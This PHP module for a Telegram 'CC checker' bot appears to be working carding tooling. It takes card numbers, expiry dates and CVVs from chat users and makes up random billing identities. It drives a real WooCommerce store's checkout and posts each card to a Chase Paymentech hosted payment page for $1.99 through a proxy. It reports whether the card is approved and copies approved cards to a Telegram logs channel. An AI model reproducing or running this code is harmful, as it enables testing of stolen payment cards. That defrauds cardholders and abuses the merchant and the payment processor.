<?php



/*

///==[Anti CC Checker Commands]==///

*** .!/ccn creditcard - Anti-Biotic Charge (Chase Paymentech) CCN ***

*/
$gateway = "Anti-Biotic Charge";
$check_type = "CCN";
################## includes #################################

$time_start = microtime(true);
$dir = dirname(__dir__,2);
include($dir."/config/config.php");
include($dir."/config/variables.php");
include_once($dir."/functions/bot.php");
include_once($dir."/functions/db.php");
include_once($dir."/functions/functions.php");

################## filter valid data commands #######################################
if(strpos($message, "/ccn ") === 0 || strpos($message, "!ccn ") === 0 || strpos($message, ".ccn ") === 0){

    $trans_completed = false;
    $tries = 0;
    $limit = 1;
    ################ loop until transaction completed ############################
    while ($trans_completed == false && $tries < $limit ) {
        ################ checking user for antispam #####################
        $tries = $tries + 1;
        $antispam = antispamCheck($userId);
        $isPremium = get_prem_info($userId);
        addUser($userId);
        if ($antispam != False && $isPremium == "no"){
            bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id
            ]);
            return;

        } else {
            $messageidtoedit1 = bot('sendmessage', [
                'chat_id' => $chat_id,
                'text' => "<b>Wait for result...</b>",
                'parse_mode' => 'html',
                'reply_to_message_id' => $message_id

            ]);

            $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
            $lista = substr($message, 5);

############################## verify the cc value if valid ############################################
  if (preg_match_all("/(\d{15})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{4})/", $lista, $matches)||preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
    ############################## extracting card data / generate random info #############################
                $creditcard = $matches[0][0];
                $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
                $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
                $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
                $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
                $yy1 = substr($yy, 2, 2);
                $bin = substr($cc, 0, 6);
                $cbin = substr($cc, 0, 1);
                $binlist = json_decode(fbankinfo($bin),true);
                $ccbank = $binlist['Bank'];
                $ccvendor = $binlist['Vendor'];
                $cctype = $binlist['Bank_Info'];
                $cc_country = $binlist['Country'];
                $abn = $binlist['Abn'];
                $cc_emoji = $binlist['emoji'];

                $str = substr(RandomString(),0,7);

                $info = random_info();
                $fname = $info['fname'];
                $lname = $info['lname'];
                $email = $info['email'];
                $street = $info['street'];
                $city = $info['city'];
                $state = $info['state'];
                $phone = $info['phone'];
                $postcode = $info['postcode'];
                ###CHECKER PART###
                $zip = rand(90010,94000);
                if($cbin == 5){
                    $cbin = 'mastercard';
                }
                else if($cbin == 4){
                    $cbin = 'visa';
                }


######################## GATEWAY CHECKER - REST API AREA ######################################################
                $cookie = RandomString();
                $add_cart =   cURL(
                    "https://vintageeyewearshowroom.com/?wc-ajax=add_to_cart",
                    $headers = [
                        "accept: application/json, text/javascript, */*; q=0.01",
                        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
                        "x-requested-with: XMLHttpRequest"
                    ],
                    'product_sku=&product_id=12140&quantity=1',
                    "POST",
                    1,
                    $cookie
                );

                $checkout =  cURL(
                    "https://vintageeyewearshowroom.com/checkout/",
                    $headers = [
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "referer: https://www.vintageeyewearshowroom.com/cart/",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
                    ],
                    "",
                    "GET",
                    1,
                    $cookie
                );
                $wp_nonce = GetStr($checkout,'name="woocommerce-process-checkout-nonce" value="','"');


                $_checkout = cURL(
                    "https://vintageeyewearshowroom.com/?wc-ajax=checkout",
                    $headers = [
                        "accept: application/json, text/javascript, */*; q=0.01",
                        "content-type: application/x-www-form-urlencoded; charset=UTF-8",
                        "referer: https://vintageeyewearshowroom.com/checkout/",
                        "x-requested-with: XMLHttpRequest",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
                    ],
                    "billing_first_name=$fname&billing_last_name=$lname&billing_company=&billing_country=US&billing_address_1=$street&billing_address_2=&billing_city=$city&billing_state=CA&billing_postcode=".rand(91000,93000)."&billing_phone=$phone&billing_email=$email&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=NY&shipping_postcode=&order_comments=&shipping_method%5B0%5D=legacy_free_shipping&payment_method=chase_paymentech&terms=on&terms-field=1&woocommerce-process-checkout-nonce=$wp_nonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review",
                    "POST",
                    1,
                    $cookie
                );

                $rdr = stripcslashes(GetStr($_checkout,'"redirect":"','"'));


                $e =  cURL(
                    "$rdr",
                    $headers = [
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Referer: https://www.abc-clio.com/checkout/",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
                    ],
                    "",
                    "GET",
                    1,
                    $cookie
                );

                $rdr = htmlspecialchars_decode(GetStr($e,'style="width:100%;margin-bottom:0;border:0;" src="','"'));

                $hpf =  cURL(
                    "$rdr",
                    $headers = [
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
                    ],
                    "",
                    "GET",
                    1,
                    $cookie
                );
                $sid = GetStr($hpf,'name="sid" value="','"');
                $sessionID = GetStr($hpf,'name="sessionId" value="','"');


                $tracer =  cURL(
                    "https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php",
                    $headers = [
                        "Accept: */*",
                        "Content-type: application/x-www-form-urlencoded",
                        "Cookie: sid=$sid",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
                    ],
                    "action=tracer&sid=$sid",
                    "POST",
                    1,
                    $cookie
                );


                $execute =  cURL_ProxyOn(
                    "https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php",
                    $headers = [
                        "Accept: */*",
                        "Content-type: application/x-www-form-urlencoded",
                        "Cookie: sid=$sid",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
                    ],
                    "sessionId=$sessionID&amount=1.99&required=&uIDTrans=1&tdsApproved=&tracer=$tracer&completeStatus=0&sid=$sid&currency_code=USD&cbOverride=1&name=dsadas%20asdsada&amountDisplay=USD%20%241.99&ccNumber=$cc&CVV2=&ccType=$cbin&expMonth=$mm&expYear=$yy&action=process&sid=$sid",
                    "POST",
                    1,
                    $cookie
                );



################## CAPTURING GATEWAY RESPONSE ####################################################
                $res = json_decode($execute,true);
                $dcode =  $res['errorCode'];
                $response = urldecode($res['gatewayMessage']);

################## GATEWAY RESPONSE CALLBACK SEND TO TELEGRAM USERCHAT / GROUPCHAT ####################################################
                $time = number_format(microtime(true) - $time_start, 2);
                clearCookie($cookie);
                if(strpos($execute,'"appCode":"')) { ## IF APPROVED ##
                        $avs =  $res['AVSMatch'];
                        $cvv =  $res['CVVMatch'];
                        $appCode = $res['appCode'];
                    addTotal();
                    addUserTotal($userId);
                    addCVV();
                    addUserCVV($userId);
                    addCCN();
                    addUserCCN($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>APPROVED ✅  
<b>Card -»</b> <code>$lista</code>
Response -» MATCHED
Approve Code -» $appCode 
AVS -» $avs 
Type -» $check_type 
Gateway -» $gateway
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);copyLogs("@payamansoyccn",$chat_id,$messageidtoedit);
                } elseif(strpos($execute,'"errorCode"')) {  ## IF DECLINED ##
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>DECLINED ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» $response
Type -» $check_type 
Gateway -» $gateway
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);$trans_completed = true;
                } else {  ## ELSE UNKNOWN RESPONSE ##
                    addTotal();
                    addUserTotal($userId);
                    bot('editMessageText', [
                        'chat_id' => $chat_id,
                        'message_id' => $messageidtoedit,
                        'text' => "<b>ERROR ❌ 
<b>Card -»</b> <code>$lista</code>
Response -» Unknown
Type -» $check_type 
Gateway -» $gateway
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country($abn) $cc_emoji 
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                        'parse_mode' => 'html',
                        'disable_web_page_preview' => 'true'

                    ]);$trans_completed = true;
                }
            }

            else {
                bot('editMessageText', [  ## IF THE PROVIDED CC VALUE IS INVALID ##
                    'chat_id' => $chat_id,
                    'message_id' => $messageidtoedit,
                    'text' => "<b>INVALID FORMAT: (cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                    'parse_mode' => 'html', 'disable_web_page_preview' => 'true']);
                $trans_completed = true;
            }
        }
    }
}


######################################################## END OF THE API ##################################################